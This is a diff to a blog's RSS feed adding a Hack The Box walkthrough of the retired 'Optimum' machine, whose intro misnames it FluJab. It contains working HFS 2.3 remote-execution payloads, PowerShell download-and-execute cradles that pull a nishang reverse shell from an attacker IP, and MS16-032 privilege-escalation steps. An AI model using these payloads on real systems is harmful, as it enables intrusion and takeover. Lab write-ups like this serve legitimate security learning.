@@ -6,8 +6,94 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright>
-        <lastBuildDate>Fri, 14 Jun 2019 17:00:00 +0700</lastBuildDate>
+        <lastBuildDate>Tue, 18 Jun 2019 22:00:00 +0700</lastBuildDate>
         <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Optimum: Hack The Box Walkthrough</title>
+            <link>/posts/2019/06/optimum-hack-the-box-walkthrough/</link>
+            <pubDate>Tue, 18 Jun 2019 22:00:00 +0700</pubDate>
+            
+            <guid>/posts/2019/06/optimum-hack-the-box-walkthrough/</guid>
+            <description>This post documents the complete walkthrough of FluJab, a retired vulnerable VM created by ch4p, and hosted at Hack The Box. If you are uncomfortable with spoilers, please stop reading now.
+ Background Optimum is a retired vulnerable VM from Hack The Box.
+Information Gathering Let&amp;rsquo;s start with masscan to enumerate the open ports in this host.
+masscan -e tun0 -p0-65535,U:0-65535 10.10.10.8 --rate=1000 Starting masscan 1.0.6 (http://bit.ly/14GZzcT) at 2019-06-18 15:36:07 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131072 ports/host] Discovered open port 80/tcp on 10.</description>
+            <content type="html"><![CDATA[
+
+<p><img src="/img/optimum.jpg" alt="Optimum" /></p>
+
+<blockquote>
+<p>This post documents the complete walkthrough of FluJab, a retired vulnerable <a href="https://www.hackthebox.eu/home/machines/profile/6" target="_blank">VM</a> created by <a href="https://www.hackthebox.eu/home/users/profile/1" target="_blank">ch4p</a>, and hosted at <a href="https://www.hackthebox.eu/" target="_blank">Hack The Box</a>. If you are uncomfortable with spoilers, please stop reading now.</p>
+</blockquote>
+
+<h2 id="background">Background</h2>
+
+<p>Optimum is a retired vulnerable VM from Hack The Box.</p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+
+<p>Let&rsquo;s start with <code>masscan</code> to enumerate the open ports in this host.</p>
+
+<pre><code>masscan -e tun0 -p0-65535,U:0-65535 10.10.10.8 --rate=1000
+
+Starting masscan 1.0.6 (http://bit.ly/14GZzcT) at 2019-06-18 15:36:07 GMT
+ -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+Initiating SYN Stealth Scan
+Scanning 1 hosts [131072 ports/host]
+Discovered open port 80/tcp on 10.10.10.8
+</code></pre>
+
+<p>Only 1 open port? Alright, let&rsquo;s open it on our web browser then.</p>
+
+<p><img src="/img/optimum_1.png" alt="Optimum_1" /></p>
+
+<p>Interesting, from here we know that the webserver is running <code>HttpFileServer 2.3</code>. A quick google search about this show us about the RCE vulnerability.</p>
+
+<p><img src="/img/optimum_2.png" alt="Optimum_2" /></p>
+
+<pre><code>The findMacroMarker function in parserLib.pas in Rejetto HTTP File Server 
+(aks HFS or HttpFileServer) 2.3x before 2.3c allows remote attackers to 
+execute arbitrary programs via a %00 sequence in a search action.
+</code></pre>
+
+<p>Sweet! Now let&rsquo;s try our RCE then. Let&rsquo;s fire up some burp.</p>
+
+<p><img src="/img/optimum_3.png" alt="Optimum_3" /></p>
+
+<p>I&rsquo;m going to use this payload to test the RCE <code>?search=%00{.exec|ping+10.10.14.45.}</code>. And then when running tcpdump, we got a response from the Box!</p>
+
+<p><img src="/img/optimum_4.png" alt="Optimum_4" /></p>
+
+<p>Sweet! Now we know that our RCE really work, let&rsquo;s create a powershell shell to communicate with the box! I&rsquo;m going to use <a href="https://github.com/samratashok/nishang" target="_blank">nishang</a> <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" target="_blank">Invoke-PowerShellTcp.ps1</a> here. Don&rsquo;t forget to add <code>Invoke-PowerShellTcp -Reverse -IPAddress Your_IP -Port Your_Port</code> by the end of the file.</p>
+
+<p>And then because most of Hack The Box boxes is made from 64 bit machine, I&rsquo;m assuming this one too. So let&rsquo;s try to call the 64 bit powershell and then ping our machine back with this payload <code>?search=%00{.exec|C%3a\Windows\Sysnative\WindowsPowershell\v1.0\powershell.exe+ping+10.10.14.45.}</code>. And yeah, don&rsquo;t forget to url encode our payload!</p>
+
+<p><img src="/img/optimum_5.png" alt="Optimum_5" /></p>
+
+<p>Nice! We got response from the box, turns out my assumption was right about this box being a 64 bit. Now let&rsquo;s try to call our nishang shell. I&rsquo;ll start by running webserver from my box and then let the box download the <code>.ps1</code> script, this is the payload that I use <code>?search=%00{.exec|C%3a\Windows\Sysnative\WindowsPowershell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadstring('http%3a//10.10.14.45/Invoke-PowerShellTcp.ps1').}</code>.</p>
+
+<p><img src="/img/optimum_6.png" alt="Optimum_6" /></p>
+
+<p><img src="/img/optimum_7.png" alt="Optimum_7" /></p>
+
+<p>Nice! Got <code>user.txt</code>!</p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<p>Privilege escalation is pretty straight forward from here. Let&rsquo;s start by enumerating the system, in here I&rsquo;m going to use <a href="https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1" target="_blank">Sherlock</a> to enumerate the system. Don&rsquo;t forget to add <code>Find-AllVulns</code> by the end of the code. Because our shell is already a powershell, I&rsquo;m going to use this command to download the <code>.ps1</code> script from my system. <code>IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.45/Sherlock.ps1')</code></p>
+
+<p><img src="/img/optimum_8.png" alt="Optimum_8" /></p>
+
+<p>From here, <code>Sherlock</code> indicating that this box appeared to be vulnerable to <code>MS16-032 Secondary Logon Handle Privilege Escalation</code>. From here I&rsquo;m going to use <a href="https://github.com/EmpireProject/Empire" target="_blank">Empire</a> <a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1" target="_blank">Invoke-MS16032.ps1</a> script. Don&rsquo;t forget to add <code>Invoke-MS16032 -Command &quot;IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.45/sh.ps1')&quot;</code> by the end of the script. I&rsquo;m going to use this payload to run the <code>Empire</code> script, <code>IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.45/Invoke-MS16032.ps1')</code>.</p>
+
+<p><img src="/img/optimum_9.png" alt="Optimum_9" /></p>
+
+<p><img src="/img/optimum_10.png" alt="Optimum_10" /></p>
+
+<p>Got <code>root.txt</code> 💃.</p>
+]]></content>
+        </item>
         
         <item>
             <title>Emoji Support</title>
